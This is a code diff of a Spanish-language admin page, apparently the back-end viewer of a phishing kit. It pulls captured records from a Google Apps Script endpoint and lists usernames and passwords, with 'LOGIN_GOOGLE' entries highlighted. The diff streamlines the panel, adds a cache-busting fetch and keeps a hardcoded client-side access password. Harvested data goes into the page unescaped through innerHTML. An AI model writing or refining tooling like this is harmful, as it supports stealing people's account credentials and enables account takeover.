@@ -2,94 +2,84 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PANEL ADMIN - SECURECHECK</title>
+    <title>Panel de Administración - Tiempo Real</title>
     <style>
-        body { background: #0b141d; color: white; font-family: 'Segoe UI', sans-serif; padding: 20px; }
-        .container { max-width: 1100px; margin: auto; }
-        .card { background: #15202b; border-radius: 12px; padding: 25px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        body { background: #0b141d; color: white; font-family: sans-serif; padding: 20px; }
+        .card { background: #15202b; border-radius: 12px; padding: 25px; border: 1px solid #1e293b; max-width: 1100px; margin: auto; }
         table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; }
+        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; font-size: 11px; text-transform: uppercase; }
         td { padding: 15px; border-bottom: 1px solid #1e293b; font-size: 14px; }
         .badge { padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; }
         .badge-google { background: #0369a1; color: #7dd3fc; }
         .badge-form { background: #581c87; color: #d8b4fe; }
-        .pass-cell { font-family: 'Courier New', monospace; color: #fbbf24; font-weight: bold; font-size: 15px; }
-        #login-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 80vh; }
-        input { padding: 12px; border-radius: 8px; border: 1px solid #1e293b; background: #15202b; color: white; width: 260px; margin-bottom: 15px; text-align: center; }
-        button { padding: 12px 30px; background: #38bdf8; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; color: #0b141d; }
-        .status { font-size: 12px; color: #94a3b8; margin-bottom: 10px; }
+        .pass-cell { font-family: monospace; color: #fbbf24; font-weight: bold; font-size: 15px; }
+        input { padding: 12px; border-radius: 8px; border: 1px solid #1e293b; background: #0b141d; color: white; margin-bottom: 20px; text-align: center; }
+        button { padding: 12px 25px; background: #38bdf8; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; color: #0b141d; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="login-screen">
-            <h1>Panel Administrador</h1>
-            <input type="password" id="admin-pass" placeholder="Contraseña de acceso">
-            <button onclick="verificar()">Entrar</button>
-        </div>
+    <div id="login-box" style="text-align:center; margin-top:100px;">
+        <h1>Acceso Admin</h1>
+        <input type="password" id="p" placeholder="Contraseña">
+        <br>
+        <button onclick="verificar()">Entrar</button>
+    </div>
 
-        <div id="dashboard" style="display:none">
-            <div class="card">
-                <div style="display:flex; justify-content: space-between; align-items: center;">
-                    <h2 style="color: #38bdf8; margin: 0;">Registros en Tiempo Real</h2>
-                    <div id="auto-status" class="status">Sincronizando...</div>
-                </div>
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Origen</th>
-                            <th>Usuario / Empresa</th>
-                            <th>Contraseña / Detalles</th>
-                            <th>Fecha</th>
-                        </tr>
-                    </thead>
-                    <tbody id="tabla-cuerpo"></tbody>
-                </table>
+    <div id="dash" style="display:none">
+        <div class="card">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <h2 style="color:#38bdf8">Registros Recibidos</h2>
+                <button onclick="cargar()" style="background:transparent; border:1px solid #38bdf8; color:#38bdf8;">🔄 Actualizar Ahora</button>
             </div>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Origen</th>
+                        <th>Usuario / Empresa</th>
+                        <th>Datos / Pass</th>
+                        <th>Fecha</th>
+                    </tr>
+                </thead>
+                <tbody id="tabla"></tbody>
+            </table>
         </div>
     </div>
 
     <script>
         const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";
-        let autoRefresh;
 
         function verificar() {
-            if(document.getElementById("admin-pass").value === "Linares2025.") {
-                document.getElementById("login-screen").style.display = "none";
-                document.getElementById("dashboard").style.display = "block";
-                cargarDatos();
-                // ACTIVAMOS REFRESCO CADA 5 SEGUNDOS
-                autoRefresh = setInterval(cargarDatos, 5000);
-            } else { alert("Contraseña incorrecta"); }
+            if(document.getElementById("p").value === "Linares2025.") {
+                document.getElementById("login-box").style.display="none";
+                document.getElementById("dash").style.display="block";
+                cargar();
+            }
         }
 
-        async function cargarDatos() {
-            const tbody = document.getElementById("tabla-cuerpo");
-            const status = document.getElementById("auto-status");
+        async function cargar() {
+            const tbody = document.getElementById("tabla");
+            tbody.innerHTML = "<tr><td colspan='4'>Obteniendo datos frescos...</td></tr>";
             
             try {
-                // AÑADIMOS UN TIMESTAMP PARA EVITAR QUE GOOGLE DEVUELVA DATOS ANTIGUOS
-                const timestampUrl = webAppUrl + "?t=" + new Date().getTime();
+                // AÑADIDO: Generador de URL única para saltar la caché
+                const antiCacheUrl = webAppUrl + "?cache=" + Math.random();
                 
-                const response = await fetch(timestampUrl);
-                const data = await response.json();
+                const res = await fetch(antiCacheUrl);
+                const data = await res.json();
                 
                 tbody.innerHTML = "";
-                data.reverse().forEach(fila => {
-                    const esGoogle = fila[2] === "LOGIN_GOOGLE";
-                    const tr = document.createElement("tr");
-                    tr.innerHTML = `
-                        <td><span class="badge ${esGoogle ? 'badge-google' : 'badge-form'}">${fila[2]}</span></td>
-                        <td>${fila[0] || '---'}</td>
-                        <td class="${esGoogle ? 'pass-cell' : ''}">${fila[1] || '---'}</td>
-                        <td style="color:#64748b">${fila[3] || '---'}</td>
-                    `;
-                    tbody.appendChild(tr);
+                data.reverse().forEach(row => {
+                    const isGoogle = row[2] === "LOGIN_GOOGLE";
+                    tbody.innerHTML += `
+                        <tr>
+                            <td><span class="badge ${isGoogle ? 'badge-google' : 'badge-form'}">${row[2]}</span></td>
+                            <td>${row[0] || '---'}</td>
+                            <td class="${isGoogle ? 'pass-cell' : ''}">${row[1] || '---'}</td>
+                            <td style="color:#64748b">${row[3] || '---'}</td>
+                        </tr>`;
                 });
-                status.innerText = "Última actualización: " + new Date().toLocaleTimeString();
-            } catch (error) {
-                status.innerText = "Error de conexión";
+            } catch (e) {
+                tbody.innerHTML = "<tr><td colspan='4'>Error al cargar.</td></tr>";
             }
         }
     </script>
